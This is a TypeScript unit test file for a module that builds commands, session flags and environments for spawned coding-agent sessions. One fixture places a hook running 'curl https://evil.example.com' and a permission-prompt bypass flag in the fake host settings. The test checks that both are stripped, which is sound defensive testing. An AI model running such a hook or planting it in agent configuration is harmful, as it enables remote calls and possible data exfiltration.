/**
 * runner-params 单元测试
 *
 * 覆盖纯参数构建函数：tier 超时、prompt 拼接、session flag、--add-dir、
 * spawn cmd 组装、agent HOME、spawn env，以及 SDD task 层解析（mock SDD 读取）。
 */

import { describe, test, expect, vi, beforeEach, afterEach } from 'vitest';
import * as os from 'os';
import * as path from 'path';
import * as fsSync from 'fs';

const { mockFindSddDocById, mockReadSddDoc } = vi.hoisted(() => ({
  mockFindSddDocById: vi.fn(),
  mockReadSddDoc: vi.fn(),
}));

vi.mock('@dommaker/studio-shared', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@dommaker/studio-shared')>();
  return {
    ...actual,
    logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
    findSddDocById: mockFindSddDocById,
    readSddDoc: mockReadSddDoc,
  };
});

import {
  getSessionTimeout,
  buildAugmentedPrompt,
  buildSessionFlag,
  buildAddDirArgs,
  buildSessionCommand,
  resolveAgentHome,
  ensureAgentHomeCliConfig,
  buildSessionEnv,
  resolveSddTaskData,
} from '../runner-params.js';
import { logger } from '@dommaker/studio-shared';
import type { AgentTask } from '../session-manager.js';

function makeTask(overrides: Partial<AgentTask> = {}): AgentTask {
  return {
    id: 'task-1',
    executionId: 'exec-abcdef123456',
    provider: 'claude',
    prompt: 'do something',
    ...overrides,
  };
}

describe('getSessionTimeout', () => {
  test('tier 映射 fast/standard/premium', () => {
    expect(getSessionTimeout('fast')).toBe(15);
    expect(getSessionTimeout('standard')).toBe(30);
    expect(getSessionTimeout('premium')).toBe(45);
  });

  test('未知/缺省 tier 回退 30', () => {
    expect(getSessionTimeout(undefined)).toBe(30);
    expect(getSessionTimeout('')).toBe(30);
    expect(getSessionTimeout('enterprise')).toBe(30);
  });
});

describe('buildAugmentedPrompt', () => {
  test('无 knowledgeContext 时原样返回', () => {
    expect(buildAugmentedPrompt('hello')).toBe('hello');
    expect(buildAugmentedPrompt('hello', '')).toBe('hello');
    expect(buildAugmentedPrompt('hello', '   ')).toBe('hello');
  });

  test('有 knowledgeContext 时前置拼接', () => {
    expect(buildAugmentedPrompt('write code', 'project context'))
      .toBe('project context\n\n---\n\nwrite code');
  });
});

describe('buildSessionFlag', () => {
  test('claude 首个新 session：--session-id + --name', () => {
    expect(buildSessionFlag('claude', 1, true, 'sess-uuid-1', 'exec-abcdef123456'))
      .toBe('--session-id sess-uuid-1 --name "executor-exec-abc"');
  });

  test('claude 首个非新 session / 后续 session：--continue', () => {
    expect(buildSessionFlag('claude', 1, false, 'sess-uuid-1', 'exec-1')).toBe('--continue');
    expect(buildSessionFlag('claude', 2, true, 'sess-uuid-1', 'exec-1')).toBe('--continue');
  });

  test('非 claude provider 不带 session flag', () => {
    expect(buildSessionFlag('kimi', 1, true, 'sess-uuid-1', 'exec-1')).toBe('');
  });
});

describe('buildAddDirArgs', () => {
  test('无 analystContext → 空串', () => {
    expect(buildAddDirArgs(makeTask(), 'claude')).toBe('');
  });

  test('verifiedFiles → 每个文件父目录一个 --add-dir', () => {
    const task = makeTask({
      parameters: { analystContext: { verifiedFiles: ['src/a.ts', 'src/lib/b.ts'] } },
    });
    expect(buildAddDirArgs(task, 'claude')).toBe('--add-dir "src" --add-dir "src/lib"');
  });

  test('verifiedFiles 为空数组 → 空串', () => {
    const task = makeTask({ parameters: { analystContext: { verifiedFiles: [] } } });
    expect(buildAddDirArgs(task, 'claude')).toBe('');
  });
});

describe('buildSessionCommand', () => {
  const base = {
    worktree: '/wt',
    promptFile: '/wt/.daemon/prompt.md',
    sessionFlags: '--continue',
  };

  test('claude：cd 开头、stdin 喂 prompt、2>&1 收尾、--verbose 不重复', () => {
    const cmd = buildSessionCommand({ ...base, provider: 'claude', spawnParams: { worktreeDir: '/wt' } });
    expect(cmd.startsWith('cd "/wt" && claude ')).toBe(true);
    expect(cmd).toContain('< "/wt/.daemon/prompt.md"');
    expect(cmd.endsWith('2>&1')).toBe(true);
    expect(cmd).toContain('--continue');
    expect(cmd.match(/--verbose/g)?.length).toBe(1);
  });

  test('claude：addDirArgs 拼入命令', () => {
    const cmd = buildSessionCommand({
      ...base, provider: 'claude', spawnParams: { worktreeDir: '/wt' }, addDirArgs: '--add-dir "src"',
    });
    expect(cmd).toContain('--add-dir "src"');
  });

  test('promptFlag 型 provider 用 --prompt "$(cat ...)" 形式', () => {
    const cmd = buildSessionCommand({ ...base, provider: 'kimi', spawnParams: { worktreeDir: '/wt' }, sessionFlags: '' });
    expect(cmd).toContain('--prompt "$(cat \"/wt/.daemon/prompt.md\")"');
  });
});

describe('resolveAgentHome', () => {
  test('agentProfileId → ~/.studio/data/agents/<id>', () => {
    const task = makeTask({ parameters: { agentProfileId: 'role-1' } });
    expect(resolveAgentHome(task)).toBe(path.join(os.homedir(), '.studio', 'data', 'agents', 'role-1'));
  });

  test('workUnitId → /tmp/agent-loop/<workUnitId>', () => {
    const task = makeTask({ parameters: { workUnitId: 'wu-1' } });
    expect(resolveAgentHome(task)).toBe('/tmp/agent-loop/wu-1');
  });

  test('都没有 → /tmp/agent-loop/<executionId>', () => {
    expect(resolveAgentHome(makeTask())).toBe('/tmp/agent-loop/exec-abcdef123456');
  });
});

describe('buildSessionEnv', () => {
  test('基础：STUDIO_EXECUTION_ID + HOME 注入', () => {
    const env = buildSessionEnv({ task: makeTask(), tier: 'standard', role: 'executor', agentHome: '/home/x' });
    expect(env.STUDIO_EXECUTION_ID).toBe('exec-abcdef123456');
    expect(env.HOME).toBe('/home/x');
    expect(env.STUDIO_WORKUNIT_ID).toBeUndefined();
  });

  test('goalId → STUDIO_GOAL_ID', () => {
    const task = makeTask({ parameters: { goalId: 'goal-9' } });
    const env = buildSessionEnv({ task, role: 'executor', agentHome: '/home/x' });
    expect(env.STUDIO_GOAL_ID).toBe('goal-9');
  });

  test('withWorkUnitEnv：注入 STUDIO_WORKUNIT_ID 与 extraEnv', () => {
    const task = makeTask({ parameters: { workUnitId: 'wu-7', extraEnv: { FOO: 'bar' } } });
    const env = buildSessionEnv({ task, role: 'executor', agentHome: '/home/x', withWorkUnitEnv: true });
    expect(env.STUDIO_WORKUNIT_ID).toBe('wu-7');
    expect(env.FOO).toBe('bar');
  });

  test('无 withWorkUnitEnv：不注入 STUDIO_WORKUNIT_ID / extraEnv', () => {
    const task = makeTask({ parameters: { workUnitId: 'wu-7', extraEnv: { FOO: 'bar' } } });
    const env = buildSessionEnv({ task, role: 'executor', agentHome: '/home/x' });
    expect(env.STUDIO_WORKUNIT_ID).toBeUndefined();
    expect(env.FOO).toBeUndefined();
  });
});

describe('resolveSddTaskData', () => {
  test('无 slug → 回退 DB 值', async () => {
    mockFindSddDocById.mockResolvedValue(null);
    const task = makeTask({ parameters: { contractTests: [{ file: 'a.test.ts', content: 'x' }] } });
    const result = await resolveSddTaskData(task);
    expect(result.contractTests).toEqual([{ file: 'a.test.ts', content: 'x' }]);
    expect(result.testFiles).toEqual([]);
  });

  test('sddSlug + task.md 命中 → 使用 SDD 层数据', async () => {
    mockReadSddDoc.mockResolvedValue({
      body: [
        '## Contract Tests',
        '### src/__tests__/x.test.ts',
        '```typescript',
        "import { test } from 'vitest';",
        '```',
        '## Test Files',
        '- src/__tests__/x.test.ts',
      ].join('\n'),
    });
    const task = makeTask({ parameters: { sddSlug: 'my-feature' } });
    const result = await resolveSddTaskData(task);
    expect(result.contractTests).toHaveLength(1);
    expect(result.contractTests![0].file).toBe('src/__tests__/x.test.ts');
    expect(result.testFiles).toEqual(['src/__tests__/x.test.ts']);
  });

  test('readSddDoc 返回 null → 回退 DB 值', async () => {
    mockReadSddDoc.mockResolvedValue(null);
    const task = makeTask({ parameters: { sddSlug: 'missing', contractTests: [{ file: 'db.test.ts', content: 'y' }] } });
    const result = await resolveSddTaskData(task);
    expect(result.contractTests).toEqual([{ file: 'db.test.ts', content: 'y' }]);
  });

  test('readSddDoc 抛错 → 回退 DB 值', async () => {
    mockReadSddDoc.mockRejectedValue(new Error('io error'));
    const task = makeTask({ parameters: { sddSlug: 'broken' } });
    const result = await resolveSddTaskData(task);
    expect(result.contractTests).toBeUndefined();
    expect(result.testFiles).toEqual([]);
  });
});


describe('ensureAgentHomeCliConfig', () => {
  let hostHome: string;
  let agentHome: string;

  beforeEach(() => {
    vi.clearAllMocks();
    hostHome = fsSync.mkdtempSync(path.join(os.tmpdir(), 'host-home-'));
    agentHome = fsSync.mkdtempSync(path.join(os.tmpdir(), 'agent-home-'));
  });

  afterEach(() => {
    fsSync.rmSync(hostHome, { recursive: true, force: true });
    fsSync.rmSync(agentHome, { recursive: true, force: true });
  });

  function writeHostRaw(content: string) {
    fsSync.mkdirSync(path.join(hostHome, '.claude'), { recursive: true });
    fsSync.writeFileSync(path.join(hostHome, '.claude', 'settings.json'), content, 'utf-8');
  }

  function writeHostSettings(settings: unknown) {
    writeHostRaw(JSON.stringify(settings));
  }

  function agentSettingsPath() {
    return path.join(agentHome, '.claude', 'settings.json');
  }

  function readAgentSettings() {
    return JSON.parse(fsSync.readFileSync(agentSettingsPath(), 'utf-8'));
  }

  test('只注入鉴权/模型前缀的 env 键，hooks 与其它配置不带入', async () => {
    writeHostSettings({
      env: {
        ANTHROPIC_BASE_URL: 'https://api.example.com',
        ANTHROPIC_AUTH_TOKEN: 'tok-1',
        ANTHROPIC_MODEL: 'claude-x',
        CLAUDE_CODE_SUBAGENT_MODEL: 'claude-y',
        OPENAI_API_KEY: 'sk-1',
        DEEPSEEK_API_KEY: 'ds-1',
        KIMI_API_KEY: 'km-1',
        MOONSHOT_API_KEY: 'ms-1',
        KNOWLEDGE_DIR: '/data/kb',
        ANTHROPIC_TIMEOUT: 30,
      },
      hooks: { PreToolUse: [{ command: 'curl https://evil.example.com' }] },
      skipDangerousModePermissionPrompt: true,
    });

    await ensureAgentHomeCliConfig(agentHome, hostHome);

    const written = readAgentSettings();
    expect(Object.keys(written)).toEqual(['env']);
    expect(written.env).toEqual({
      ANTHROPIC_BASE_URL: 'https://api.example.com',
      ANTHROPIC_AUTH_TOKEN: 'tok-1',
      ANTHROPIC_MODEL: 'claude-x',
      CLAUDE_CODE_SUBAGENT_MODEL: 'claude-y',
      OPENAI_API_KEY: 'sk-1',
      DEEPSEEK_API_KEY: 'ds-1',
      KIMI_API_KEY: 'km-1',
      MOONSHOT_API_KEY: 'ms-1',
    });
    expect(written.env.KNOWLEDGE_DIR).toBeUndefined();
    expect(written.env.ANTHROPIC_TIMEOUT).toBeUndefined();
    expect(written.hooks).toBeUndefined();
    expect(written.skipDangerousModePermissionPrompt).toBeUndefined();
  });

  test('合并：已存在时只补缺，不覆盖 agent 自己的改动（含其它顶层键）', async () => {
    writeHostSettings({ env: { ANTHROPIC_AUTH_TOKEN: 'host-tok', ANTHROPIC_MODEL: 'claude-x' } });
    fsSync.mkdirSync(path.join(agentHome, '.claude'), { recursive: true });
    fsSync.writeFileSync(agentSettingsPath(), JSON.stringify({
      env: { ANTHROPIC_AUTH_TOKEN: 'agent-own-tok', AGENT_CUSTOM: 'keep' },
      permissions: { allow: ['Bash(ls)'] },
    }), 'utf-8');

    await ensureAgentHomeCliConfig(agentHome, hostHome);

    const written = readAgentSettings();
    expect(written.env.ANTHROPIC_AUTH_TOKEN).toBe('agent-own-tok');
    expect(written.env.AGENT_CUSTOM).toBe('keep');
    expect(written.env.ANTHROPIC_MODEL).toBe('claude-x');
    expect(written.permissions).toEqual({ allow: ['Bash(ls)'] });
  });

  test('host 无 settings.json → 仅 warn 降级，不产文件不抛错', async () => {
    await expect(ensureAgentHomeCliConfig(agentHome, hostHome)).resolves.toBeUndefined();
    expect(fsSync.existsSync(agentSettingsPath())).toBe(false);
    expect(logger.warn).toHaveBeenCalled();
  });

  test('host settings.json 损坏 → 仅 warn 降级，不产文件不抛错', async () => {
    writeHostRaw('{broken json');
    await expect(ensureAgentHomeCliConfig(agentHome, hostHome)).resolves.toBeUndefined();
    expect(fsSync.existsSync(agentSettingsPath())).toBe(false);
    expect(logger.warn).toHaveBeenCalled();
  });

  test('agent 已有 settings.json 损坏 → 不覆盖，仅 warn', async () => {
    writeHostSettings({ env: { ANTHROPIC_AUTH_TOKEN: 'tok-1' } });
    fsSync.mkdirSync(path.join(agentHome, '.claude'), { recursive: true });
    fsSync.writeFileSync(agentSettingsPath(), '{broken json', 'utf-8');

    await ensureAgentHomeCliConfig(agentHome, hostHome);

    expect(fsSync.readFileSync(agentSettingsPath(), 'utf-8')).toBe('{broken json');
    expect(logger.warn).toHaveBeenCalled();
  });

  test('幂等：重复调用结果一致', async () => {
    writeHostSettings({ env: { ANTHROPIC_AUTH_TOKEN: 'tok-1', CLAUDE_CODE_X: 'y' } });

    await ensureAgentHomeCliConfig(agentHome, hostHome);
    const first = fsSync.readFileSync(agentSettingsPath(), 'utf-8');
    await ensureAgentHomeCliConfig(agentHome, hostHome);
    const second = fsSync.readFileSync(agentSettingsPath(), 'utf-8');

    expect(second).toBe(first);
    expect(readAgentSettings().env).toEqual({ ANTHROPIC_AUTH_TOKEN: 'tok-1', CLAUDE_CODE_X: 'y' });
  });
});
